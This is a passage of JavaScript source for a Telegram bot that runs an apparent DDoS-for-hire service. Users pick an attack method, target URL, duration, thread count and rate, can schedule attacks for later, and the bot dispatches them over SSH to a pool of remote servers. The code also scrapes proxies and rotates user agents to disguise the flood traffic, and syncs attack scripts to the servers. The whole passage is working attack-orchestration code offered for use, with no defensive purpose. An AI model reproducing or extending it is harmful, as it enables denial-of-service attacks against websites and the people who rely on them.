    const until = Date.now() + mcd * 1000;
    if (!cur || cur.until < until) setCooldown(user.telegramId, mcd);
  }

  audit('attack_launched', user.telegramId, { method: method.id, target: parsed.target, ok: okCount, total: totalTargets, intensity: level, servers: servers.map(s => s.id) });

  const s = serverStats();
  const lines = [
    okCount > 0 ? '✅ <b>Attack dispatched</b>' : '❌ <b>Attack failed</b>', '',
    `${method.emoji || '📦'} ${esc(method.name)}${intensityTag}`,
    `🎯 <code>${esc(parsed.target)}</code>`,
    `⏱ ${parsed.duration}s`,
    `📊 Est. aggregate: ~${formatNum(totalEstRps)}`, '',
    `📡 ${s.online}/${s.total} online · ⚔️ ${s.attacking} attacking`,
    `🎯 Launched: <b>${okCount}</b>/${totalTargets}`,
  ];
  if (okCount < totalTargets) {
    lines.push(`\n⚠️ ${totalTargets - okCount} failed:`);
    results.filter(r => !r.ok).slice(0, 5).forEach(r => lines.push(`• ${esc(r.error)}`));
  }

  await edit(chatId, progress.message_id, lines.join('\n'), { reply_markup: { inline_keyboard: [[btn('📊 Status', 'menu_status', 'primary'), btn('🕹 Sessions', 'menu_sessions', 'primary')]] } });

  const checkDone = () => {
    const still = Object.values(store.sessions.get()).filter(x => x.batchId === batchId && x.status === 'running');
    if (still.length === 0) {
      ATTACKS.removeListener('stopped', checkDone);
      bot.sendMessage(chatId, `🏁 <b>Attack finished</b>\n\n${method.emoji} ${esc(method.name)}\n🎯 <code>${esc(parsed.target)}</code>\n⏱ ${parsed.duration}s`, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(() => {});
    }
  };
  ATTACKS.on('stopped', checkDone);
  setTimeout(checkDone, parsed.duration * 1000 + 5000);
}

/* ══════════════════════════════════════════════════════════════════════════
   SCHEDULED ATTACKS
   ══════════════════════════════════════════════════════════════════════════ */

function parseDelay(str) {
  const m = String(str || '').match(/^(\d+)([smh])$/i);
  if (!m) return null;
  const n = parseInt(m[1], 10);
  const unit = m[2].toLowerCase();
  const mult = unit === 's' ? 1000 : unit === 'm' ? 60000 : 3600000;
  return n * mult;
}

function processScheduled() {
  const now = Date.now();
  const due = [];
  store.scheduled.mutate(sc => {
    for (const [id, job] of Object.entries(sc)) {
      if (job.runAt <= now && !job.fired) {
        due.push({ id, ...job });
        job.fired = true;
      }
    }
    for (const [id, job] of Object.entries(sc)) {
      if (job.fired && job.runAt < now - 3600000) delete sc[id];
    }
  });
  for (const job of due) runScheduledJob(job);
}

async function runScheduledJob(job) {
  const user = getUser(job.userId);
  if (!user) return;
  const method = getMethod(job.methodId);
  if (!method) return;
  try {
    const parsed = method.parse([job.target, String(job.duration), String(job.threads || 16), String(job.rate || 90)]);
    const chatId = job.chatId || user.telegramId;
    await bot.sendMessage(chatId, `⏰ <b>Scheduled attack firing</b>\n\n${method.emoji} ${esc(method.name)}\n🎯 <code>${esc(job.target)}</code>\n⏱ ${job.duration}s`, { parse_mode: 'HTML' }).catch(() => {});
    await runAttack(user, method, parsed, chatId, { intensity: job.intensity || 'custom' });
  } catch (e) {
    console.error('[schedule]', e.message);
  }
}

setInterval(processScheduled, 15000).unref();

const pendingInput = new Map();

/* ══════════════════════════════════════════════════════════════════════════
   COMMANDS
   ══════════════════════════════════════════════════════════════════════════ */

bot.onText(/^\/start\b/, guardCommand(async msg => { ensureUser(msg); await showMainMenu(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/menu\b/, guardCommand(async msg => { ensureUser(msg); await showMainMenu(msg.chat.id, null, msg.from.id); }));

bot.onText(/^\/ping\b/, guardCommand(async msg => {
  const t0 = Date.now();
  try {
    await bot.getMe();
    const ms = Date.now() - t0;
    await reply(msg, `🏓 <b>Pong</b>\n\nLatency: <b>${ms}ms</b>\n${ms < 300 ? '🟢 Fast' : ms < 800 ? '🟡 Normal' : '🔴 Slow'}`);
  } catch (e) { await reply(msg, `❌ Ping fail: ${esc(e.message)}`); }
}));

bot.onText(/^\/uptime\b/, guardCommand(async msg => {
  const up = process.uptime() * 1000;
  const mem = process.memoryUsage();
  const q = attackQueue.stats();
  const s = serverStats();
  await reply(msg, [
    `⏱ <b>Uptime</b>`,
    `Running: <b>${formatDuration(up)}</b>`,
    `Heap: ${(mem.heapUsed / 1048576).toFixed(1)} / ${(mem.heapTotal / 1048576).toFixed(1)} MB`,
    `RSS: ${(mem.rss / 1048576).toFixed(1)} MB`, ``,
    `📡 Servers: ${s.online}/${s.total}`,
    `🎯 Queue: ${q.pending} pending · ${q.running} running`,
    `🕹 Sessions: ${Object.values(store.sessions.get()).filter(x => x.status === 'running').length}`,
    `🌐 Proxies: ${formatNum(readProxies().length)} · 🎭 UAs: ${formatNum(readUAs().length)}`,
  ].join('\n'));
}));

bot.onText(/^\/queue\b/, guardCommand(async msg => {
  const q = attackQueue.stats();
  const pendingSess = Object.values(store.scheduled.get()).filter(j => !j.fired).length;
  await reply(msg, [
    `🎯 <b>Attack Queue</b>`, ``,
    `Pending: <b>${q.pending}</b>`,
    `Running: <b>${q.running}</b>`,
    `Max capacity: <b>${q.max}</b>`,
    `Scheduled: <b>${pendingSess}</b>`, ``,
    q.pending > 0 ? `<i>Queue is active — attacks dispatched when slot free.</i>` : `<i>Queue empty.</i>`,
  ].join('\n'));
}));

bot.onText(/^\/top\b/, guardCommand(async msg => { ensureUser(msg); await showTop(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/favorites\b/, guardCommand(async msg => { ensureUser(msg); await showFavorites(msg.chat.id, null, msg.from.id); }));

bot.onText(/^\/schedule(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  const user = ensureUser(msg);
  if (user.role === 'pending') return reply(msg, '⏳ Pending approval');
  if (user.role === 'banned') return reply(msg, '🚫 Banned');
  if (!match[1]) return reply(msg, [
    `⏰ <b>Schedule Attack</b>`, ``,
    `<b>Usage:</b>`,
    `<code>/schedule &lt;method&gt; &lt;url&gt; &lt;dur&gt; in &lt;delay&gt;</code>`, ``,
    `<b>Delay format:</b> <code>30s</code> · <code>5m</code> · <code>2h</code>`,
    `<b>Example:</b> <code>/schedule blast https://x.com 60 in 5m</code>`, ``,
    `<i>Max delay 24h. Max ${CONFIG.MAX_SCHEDULED} jobs.</i>`,
  ].join('\n'));

  const parts = match[1].trim().split(/\s+/);
  const inIdx = parts.findIndex(p => p.toLowerCase() === 'in');
  if (inIdx === -1 || inIdx + 1 >= parts.length) return reply(msg, '❌ Format: <code>... in 5m</code>');
  const delayStr = parts[inIdx + 1];
  const delayMs = parseDelay(delayStr);
  if (!delayMs || delayMs < 1000) return reply(msg, '❌ Delay invalid. Contoh: <code>30s</code>, <code>5m</code>, <code>2h</code>');
  if (delayMs > CONFIG.SCHEDULED_MAX_DELAY_MS) return reply(msg, `❌ Max delay 24h`);

  const args = parts.slice(0, inIdx);
  const [methodId, target, durStr] = args;
  if (!methodId || !target || !durStr) return reply(msg, '❌ Missing args. Contoh: <code>/schedule blast https://x.com 60 in 5m</code>');

  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method <code>${esc(methodId)}</code>`);
  if (!userCanUseMethod(user, method.id)) return reply(msg, '🔒 No access');
  const dur = parseInt(durStr, 10);
  if (!dur || dur < 1 || dur > 3600) return reply(msg, '❌ Duration 1-3600s');
  try { validateTarget(target); checkUserLimits(user, dur, 0, 0); } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  const count = Object.values(store.scheduled.get()).filter(j => j.userId === user.telegramId && !j.fired).length;
  if (count >= 5) return reply(msg, '❌ Max 5 scheduled per user');

  const id = 'sch_' + crypto.randomBytes(4).toString('hex');
  store.scheduled.mutate(sc => {
    sc[id] = {
      userId: user.telegramId, chatId: msg.chat.id,
      methodId: method.id, target, duration: dur,
      runAt: Date.now() + delayMs, fired: false,
      createdAt: Date.now(),
    };
  });
  await reply(msg, [
    `⏰ <b>Attack scheduled</b>`, ``,
    `${method.emoji} ${esc(method.name)}`,
    `🎯 <code>${esc(target)}</code>`,
    `⏱ ${dur}s`,
    `🚀 Fires in: <b>${formatDuration(delayMs)}</b>`,
    `<code>${id}</code>`,
  ].join('\n'));
}));

bot.onText(/^\/help\b/, guardCommand(async msg => {
  const methods = availableMethods();
  await reply(msg, [
    `⚫ <b>${BRAND} — Commands</b> ⚫`, ``,
    `<b>💥 Attack (remote-only)</b>`,
    `/attack — method picker`,
    `/attack &lt;method&gt; &lt;url&gt; &lt;dur&gt; [threads] [rate]`,
    `/schedule &lt;method&gt; &lt;url&gt; &lt;dur&gt; in &lt;delay&gt;`, ``,
    `<b>📊 Info</b>`,
    `/methods /servers /status /sessions /history`,
    `/ping /uptime /queue /top /favorites`, ``,
    `<b>🧠 Intensities</b>`,
    `/intensities /eligible`, ``,
    `<b>💥 Methods (${methods.length})</b>`,
    methods.map(m => `${m.emoji} <code>${m.id}</code>`).join(' '), ``,
    `<b>🛡 Manage (admin)</b>`,
    `/scandeps /installdeps /provision /syncmethods /syncaux /killall`,
    `/ua /proxies /aux /health`, ``,
    `<i>All attacks run on remote servers. Bot server never attacks.</i>`,
  ].join('\n'));
}));

bot.onText(/^\/sshtest(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const args = (match[1] || '').trim().split(/\s+/);
  if (args.length < 1) return reply(msg, `Usage:\n<code>/sshtest host:port [user] [pass]</code>`);
  const [hp, user, pass] = args;
  const m = hp.match(/^([\w.-]+):(\d+)$/);
  if (!m) return reply(msg, '❌ Format: <code>host:port</code>');
  const host = m[1], port = parseInt(m[2], 10);
  const sm = await reply(msg, `🧪 Testing <code>${esc(host)}:${port}</code>…`);
  const r = await sshTest(host, port, user, pass, 15000);
  const lines = [
    `🧪 <b>SSH Test — ${esc(host)}:${port}</b>`, '',
    `🔌 TCP: ${r.tcp === 'open' ? '🟢 open' : `🔴 ${esc(r.tcp)}`}`,
    user && pass ? `🔑 Auth: ${r.auth === 'ok' ? '🟢 ok' : r.auth === 'fail' ? `🔴 ${esc(r.error || 'fail')}` : '⏳'}` : '🔑 Auth: — (no creds)',
    r.authInfo ? `ℹ️ Info: <code>${esc(r.authInfo)}</code>` : '',
    `⏱ Elapsed: ${r.elapsed}ms`,
    '',
    r.tcp === 'open' && r.auth === 'ok' ? '✅ <b>Ready to add</b>' : r.tcp !== 'open' ? '💡 <i>Port likely wrong. Try 2222 / 22022 / check provider.</i>' : '',
  ].filter(Boolean).join('\n');
  await edit(msg.chat.id, sm.message_id, lines);
}));

bot.onText(/^\/proxies\b/, guardCommand(async msg => { if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only'); await showAdminProxies(msg.chat.id, null); }));
bot.onText(/^\/aux\b/, guardCommand(async msg => { if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only'); await showAdminAux(msg.chat.id, null); }));
bot.onText(/^\/scandeps\b/, guardCommand(async msg => { if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only'); await showScanDeps(msg.chat.id, null); }));

bot.onText(/^\/provision\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get();
  if (!servers.length) return reply(msg, '📭 No servers');
  await reply(msg, `⚡ Provisioning ${servers.length}…`);
  let ok = 0;
  for (const s of servers) {
    try { const conn = await getServerConn(s.id); await provisionRemote(s.id, conn); ok++; }
    catch (e) { await reply(msg, `❌ ${esc(s.name)}: ${esc(e.message.slice(0, 100))}`); }
  }
  await reply(msg, `✅ ${ok}/${servers.length}`);
}));

bot.onText(/^\/installdeps\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get().filter(s => s.status === 'online');
  if (!servers.length) return reply(msg, '📭 No online servers');
  const rawDeps = getAllMethodDeps();
  await reply(msg, `📦 Installing on ${servers.length}…\n<i>${rawDeps.length} npm packages</i>`);
  let ok = 0;
  const failed = [];
  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      const env = remoteEnvCache.get(s.id) || await collectRemoteEnv(s.id, conn);
      if (!env?.nodePath) { failed.push(`${s.name}: no node`); continue; }
      for (const m of availableMethods()) { try { await ensureMethodOnRemote(conn, s.id, m.file); } catch {} }
      remoteDepsCache.delete(s.id);
      await ensureDepsOnRemote(conn, s.id, env);
      ok++;
    } catch (e) { failed.push(`${s.name}: ${e.message.slice(0, 80)}`); }
  }
  const txt = [`✅ Complete on <b>${ok}/${servers.length}</b>`];
  if (failed.length) { txt.push('', '<b>Failed:</b>'); failed.forEach(f => txt.push(`• ${esc(f)}`)); }
  await reply(msg, txt.join('\n'));
}));

bot.onText(/^\/intensities\b/, guardCommand(async msg => { ensureUser(msg); await showIntensities(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/eligible\b/, guardCommand(async msg => { if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only'); await showEligible(msg.chat.id, null); }));

bot.onText(/^\/health\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const mem = process.memoryUsage();
  const uptime = process.uptime();
  const sessions = Object.values(store.sessions.get()).filter(s => s.status === 'running').length;
  const q = attackQueue.stats();
  const s = serverStats();
  await reply(msg, [
    `💚 <b>Health ${VERSION}</b>`, ``,
    `⏱ Uptime: ${formatDuration(uptime * 1000)}`,
    `🧠 Heap: ${(mem.heapUsed / 1048576).toFixed(1)} / ${(mem.heapTotal / 1048576).toFixed(1)} MB`,
    `📡 Servers: ${s.online}/${s.total}`,
    `🎯 Queue: ${q.pending} pending · ${q.running} running`,
    `🕹 Sessions: ${sessions}`,
    `💥 Methods: ${allMethods().filter(m => m.enabled).length}/${allMethods().length}`,
    `🌐 Proxies: ${formatNum(readProxies().length)} · 🎭 UAs: ${formatNum(readUAs().length)}`,
    `⚙️ Concurrency: ${CONFIG.MAX_CONCURRENT_PER_SERVER}/server`,
    `🔌 SSH conns: ${serverConns.size}`,
    `🌀 Restarts: ${pollingRestarts}`,
    `🖥 Mode: <b>REMOTE-ONLY</b>`,
  ].join('\n'));
}));

bot.onText(/^\/attack(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  const user = ensureUser(msg);
  if (user.role === 'pending') return reply(msg, '⏳ <b>Pending approval.</b>');
  if (user.role === 'banned') return reply(msg, '🚫 <b>Banned.</b>');
  if (!getBucket(user.telegramId).take(1)) return reply(msg, '🌊 <b>Slow down.</b>');

  const cdLeft = getCooldownLeft(msg.from.id);
  if (cdLeft > 0) return reply(msg, `⏳ Cooldown: <b>${cdLeft}s</b>`);

  if (!match[1]) return startAttackFlow(msg.chat.id, user.telegramId);

  const rawArgs = match[1].trim().split(/\s+/);
  let group = null;
  const gIdx = rawArgs.indexOf('--group');
  if (gIdx > -1 && rawArgs[gIdx + 1]) { group = rawArgs[gIdx + 1]; rawArgs.splice(gIdx, 2); }

  const methodId = rawArgs[0];
  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method <code>${esc(methodId)}</code>\n\n<b>Available:</b>\n${availableMethods().map(m => `${m.emoji} <code>${m.id}</code>`).join('\n')}`);
  if (!isMethodEnabled(method.id)) return reply(msg, `🔴 <b>${esc(method.name)}</b> disabled.`);
  if (!userCanUseMethod(user, method.id)) return reply(msg, `🔒 No access to <b>${esc(method.name)}</b>.`);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing file <code>${method.file}</code>`);

  const methodRateWait = checkMethodRate(msg.from.id, method.id);
  if (methodRateWait > 0) return reply(msg, `⏳ Method rate-limit: wait <b>${methodRateWait}s</b>`);

  const conc = user.limits?.maxConcurrent || 0;
  if (conc > 0 && userActiveBatches(msg.from.id) >= conc) return reply(msg, `❌ Max concurrent attacks (${conc}) reached.`);

  const target = rawArgs[1];
  const duration = rawArgs[2];
  const threadsArg = rawArgs[3];
  const rateArg = rawArgs[4];
  const extras = rawArgs.slice(5);

  if (!target || !duration) return reply(msg, `❌ Missing args.\n<b>Usage:</b>\n<code>/attack ${method.id} &lt;url&gt; &lt;dur&gt;</code>`);

  if (threadsArg && rateArg) {
    let parsed;
    try {
      parsed = method.parse([target, String(duration), String(threadsArg), String(rateArg), ...extras]);
      if (!parsed.target || !parsed.duration) throw new Error('target and duration required');
      const t = validateTarget(parsed.target);
      if (isBlacklisted(t.host)) throw new Error('host blacklisted');
      checkUserLimits(user, parsed.duration, parsed.threads, parsed.rate, parsed);
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return runAttack(user, method, parsed, msg.chat.id, { group, intensity: 'custom' });
  }

  let t;
  try {
    t = validateTarget(target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 <code>${esc(t.host)}</code> blacklisted`);
    const dur = Number(duration);
    if (!dur || dur < 1 || dur > 3600) throw new Error('duration 1-3600s');
    checkUserLimits(user, dur, 0, 0);
  } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  await showIntensityMenu(msg.chat.id, user.telegramId, method.id, target, String(duration));
}));

async function startAttackFlow(chatId, userId) {
  const user = getUser(userId) || { telegramId: userId };
  const methods = visibleMethodsFor(user);
  if (methods.length === 0) return bot.sendMessage(chatId, '📭 No methods available.');
  const favIds = getFavorites(userId);
  const kb = [];
  if (favIds.length) {
    kb.push([btn('⭐ Favorites', 'menu_favs', 'success')]);
  }
  for (const m of methods) {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const icon = !m.enabled ? '🔴' : (ok ? m.emoji || '📦' : '❌');
    kb.push([btn(`${icon} ${m.name}`, `pickm_${m.id}`, m.enabled && ok ? 'primary' : 'danger')]);
  }
  kb.push([btn('❌ Cancel', 'int_cancel', 'danger')]);
  await bot.sendMessage(chatId, `💥 <b>New Attack</b>\n\n<b>Pick a method:</b>\n<i>${methods.length} available</i>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function startQuickLaunch(chatId, user, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  if (!isMethodEnabled(m.id)) return reply({ chat: { id: chatId } }, '🔴 Disabled');
  if (!userCanUseMethod(user, m.id)) return reply({ chat: { id: chatId } }, '🔒 No access');
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file))) return reply({ chat: { id: chatId } }, `❌ File <code>${esc(m.file)}</code> missing`);
  const aux = scanMethodAux(m.file);
  const missingAux = aux.filter(a => !fs.existsSync(path.join(CONFIG.SCRIPT_DIR, a)));
  const auxWarn = missingAux.length ? `\n⚠️ <i>missing locally: ${missingAux.join(', ')}</i>` : '';
  const specialHint = m.parseIntensity ? `\n<i>Uses conn×streams</i>` : '';
  pendingInput.set(user.telegramId, { action: 'quick_target', data: { methodId }, expires: Date.now() + 180000 });
  await bot.sendMessage(chatId,
    `${m.emoji} <b>${esc(m.name)}</b>\n\n<b>Step 1/3</b> — Send the target URL:\n<code>https://target.com</code>\n\n<i>${esc(m.desc)}</i>${auxWarn}${specialHint}\n\n<i>/cancel to abort</i>`,
    { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
}

bot.onText(/^\/methods\b/, guardCommand(async msg => { ensureUser(msg); await showMethods(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/servers\b/, guardCommand(async msg => { ensureUser(msg); await showServers(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/status\b/, guardCommand(async msg => { ensureUser(msg); await showStatus(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/sessions\b/, guardCommand(async msg => { ensureUser(msg); await showSessions(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/history\b/, guardCommand(async msg => { ensureUser(msg); await showHistory(msg.chat.id, null, msg.from.id, 1); }));

bot.onText(/^\/logs(?:\s+(.+))?/, guardCommand(async msg => {
  ensureUser(msg);
  const id = (msg.text.match(/^\/logs\s+(\S+)/) || [])[1];
  if (!id) return reply(msg, 'Usage: <code>/logs &lt;session_id&gt;</code>');
  const live = store.sessions.get()[id];
  if (!live) return reply(msg, '❌ Not found');
  if (live.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not yours');
  const out = await tailSessionLog(id, 30);
  await reply(msg, `📜 <b>Logs ${esc(id)}</b>\n\n<pre>${esc(out.slice(0, 3500))}</pre>`);
}));

bot.onText(/^\/broadcast(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  if (!match[1]) return reply(msg, 'Usage: <code>/broadcast &lt;msg&gt;</code>');
  const text = match[1].trim();
  const users = Object.values(store.users.get()).filter(u => u.role === 'admin' || u.role === 'user');
  await reply(msg, `📢 Broadcasting…`);
  let ok = 0, fail = 0;
  for (const u of users) {
    try { await bot.sendMessage(u.telegramId, `📢 <b>${BRAND}</b>\n\n${esc(text)}`, { parse_mode: 'HTML' }); ok++; }
    catch { fail++; }
    await new Promise(r => setTimeout(r, 50));
  }
  await reply(msg, `✅ Sent: ${ok} · ❌ Failed: ${fail}`);
}));

bot.onText(/^\/me\b/, guardCommand(async msg => {
  const u = ensureUser(msg);
  const l = u.limits || {};
  const cdLeft = getCooldownLeft(msg.from.id);
  await reply(msg, [
    `${roleBadge(u)} <b>Account</b>`,
    `ID: <code>${u.telegramId}</code> · Role: <b>${roleLabel(u)}</b>`, ``,
    `⏱ Dur ${l.maxDuration || '∞'}s · Threads ${l.maxThreads || '∞'} · Rate ${l.maxRate || '∞'}`,
    `⚔️ Concurrent attacks: ${l.maxConcurrent || '∞'}`,
    `🖥 Servers/attack: ${l.maxServers || '∞'}`,
    `Access: <b>${userAccessBadge(u)}</b>`,
    `Total attacks: <b>${u.attackCount || 0}</b>`,
    cdLeft ? `⏳ Cooldown ${cdLeft}s` : '',
  ].filter(Boolean).join('\n'), { reply_markup: mainMenu(msg.from.id) });
}));

bot.onText(/^\/stop(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  ensureUser(msg);
  const id = match[1];
  if (!id) return reply(msg, 'Usage: <code>/stop &lt;id&gt;</code> or <code>/stop batch &lt;batchId&gt;</code>');
  if (id === 'batch') {
    const parts = (msg.text || '').split(/\s+/);
    const batchId = parts[2];
    if (!batchId) return reply(msg, 'Usage: <code>/stop batch &lt;batchId&gt;</code>');
    const n = stopBatch(batchId, isAdmin(msg.from.id) ? null : msg.from.id);
    return reply(msg, n ? `✅ Stopped ${n} session(s)` : '❌ Nothing to stop');
  }
  const s = store.sessions.get()[id];
  if (!s) return reply(msg, '❌ Not found');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not yours');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped <code>${id}</code>`);
}));

bot.onText(/^\/killall\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const n = stopAllSessions(null);
  await reply(msg, n ? `💀 Killed ${n}` : '📭 None');
}));

bot.onText(/^\/scrape\b/, guardCommand(async msg => {
  const u = ensureUser(msg);
  if (!isAdmin(msg.from.id) && u.role !== 'user') return reply(msg, '❌ Denied');
  await reply(msg, '🔄 Scraping proxies…');
  const n = await scrapeProxies();
  await reply(msg, `✅ +${n} · Total ${readProxies().length}`);
}));

bot.onText(/^\/syncmethods\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get().filter(s => s.status === 'online');
  if (!servers.length) return reply(msg, '📭 No online servers');
  await reply(msg, `🔄 Syncing to ${servers.length}…`);
  let ok = 0;
  await Promise.allSettled(servers.map(async s => { try { await syncMethodToServer(s.id, null); ok++; } catch {} }));
  await reply(msg, `✅ ${ok}/${servers.length}`);
}));

bot.onText(/^\/syncaux\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get().filter(s => s.status === 'online');
  if (!servers.length) return reply(msg, '📭 No online servers');
  await reply(msg, `📎 Syncing aux files to ${servers.length}…`);
  let ok = 0;
  await Promise.allSettled(servers.map(async s => {
    try {
      const conn = await getServerConn(s.id);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);
      for (const aux of AUX_FILES) {
        const local = path.join(CONFIG.SCRIPT_DIR, aux);
        if (!fs.existsSync(local)) continue;
        await ensureAuxOnRemote(conn, s.id, aux);
      }
      ok++;
    } catch {}
  }));
  await reply(msg, `✅ ${ok}/${servers.length}`);
}));

bot.onText(/^\/admin\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  await showAdminPanel(msg.chat.id, null, msg.from.id);
}));

/* ══════════════════════════════════════════════════════════════════════════
   CALLBACK ROUTER
   ══════════════════════════════════════════════════════════════════════════ */

bot.on('callback_query', async q => {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const userId = q.from.id;
  const data = q.data || '';

  if (!botIsOnline() && !isAdmin(userId)) return answerCB(q.id, '🛠 Maintenance', true);

  try {
    if (data === 'menu_main')     { await answerCB(q.id, '🏠'); return showMainMenu(chatId, msgId, userId); }
    if (data === 'menu_attack')   { await answerCB(q.id, '💥'); return startAttackFlow(chatId, userId); }
    if (data === 'menu_status')   { await answerCB(q.id, '📊'); return showStatus(chatId, msgId, userId); }
    if (data === 'menu_servers')  { await answerCB(q.id, '📡'); return showServers(chatId, msgId, userId); }
    if (data === 'menu_methods')  { await answerCB(q.id, '📦'); return showMethods(chatId, msgId, userId); }
    if (data === 'menu_sessions') { await answerCB(q.id, '🕹'); return showSessions(chatId, msgId, userId); }
    if (data === 'menu_history')  { await answerCB(q.id, '📜'); return showHistory(chatId, msgId, userId, 1); }
    if (data === 'menu_favs')     { await answerCB(q.id, '⭐'); return showFavorites(chatId, msgId, userId); }
    if (data === 'menu_top')      { await answerCB(q.id, '📈'); return showTop(chatId, msgId, userId); }
    if (data === 'menu_admin')    { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '👑'); return showAdminPanel(chatId, msgId, userId); }
    if (data === 'stop_all_mine') { const n = stopAllSessions(userId); await answerCB(q.id, `Stopped ${n}`, true); return showStatus(chatId, msgId, userId); }
    if (data === 'noop') return answerCB(q.id, '');
    if (data.startsWith('hist_p')) return showHistory(chatId, msgId, userId, parseInt(data.slice(6), 10) || 1);

    if (data.startsWith('fav_')) {
      const methodId = data.slice(4);
      const added = toggleFavorite(userId, methodId);
      await answerCB(q.id, added ? '⭐ Added' : '⭐ Removed', true);
      return showMethodDetail(chatId, msgId, methodId, userId);
    }

    if (data.startsWith('pickm_')) {
      const methodId = data.slice(6);
      const user = getUser(userId) || { telegramId: userId };
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌', true);
      if (!isMethodEnabled(m.id)) return answerCB(q.id, '🔴', true);
      if (!userCanUseMethod(user, m.id)) return answerCB(q.id, '🔒', true);
      await answerCB(q.id, `${m.emoji}`);
      return startQuickLaunch(chatId, user, methodId);
    }

    if (data === 'adm_ua') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🎭'); return showAdminUA(chatId, msgId); }
    if (data === 'adm_aux') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '📎'); return showAdminAux(chatId, msgId); }
    if (data === 'ua_upload') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'ua_file', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '📁');
      return bot.sendMessage(chatId, `📁 Send <code>.txt</code> with one UA per line`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'ua_scrape') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🔄 Scraping…', true); const n = await scrapeUAs(); await answerCB(q.id, `+${n} · ${readUAs().length}`, true); return showAdminUA(chatId, msgId); }
    if (data === 'ua_validate') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      let rawCount = 0;
      if (fs.existsSync(FILES.ua)) rawCount = fs.readFileSync(FILES.ua, 'utf8').split(/\r?\n/).filter(l => l.trim()).length;
      const after = saveUAs(readUAs());
      await answerCB(q.id, `✅ ${after} valid (was ${rawCount})`, true);
      return showAdminUA(chatId, msgId);
    }
    if (data === 'ua_syncall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      if (!servers.length) return answerCB(q.id, '📭 no servers', true);
      await answerCB(q.id, '📤 Syncing…', true);
      let ok = 0;
      await Promise.allSettled(servers.map(async s => { try { const conn = await getServerConn(s.id); await ensureAuxOnRemote(conn, s.id, CONFIG.UA_FILE); ok++; } catch {} }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminUA(chatId, msgId);
    }
    if (data === 'ua_clear') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); saveUAs([]); await answerCB(q.id, '🗑', true); return showAdminUA(chatId, msgId); }
    if (data === 'aux_syncall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      if (!servers.length) return answerCB(q.id, '📭 no servers', true);
      await answerCB(q.id, '📤 Syncing aux…', true);
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          const conn = await getServerConn(s.id);
          await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);
          for (const aux of AUX_FILES) {
            const local = path.join(CONFIG.SCRIPT_DIR, aux);
            if (!fs.existsSync(local)) continue;
            await ensureAuxOnRemote(conn, s.id, aux);
          }
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminAux(chatId, msgId);
    }

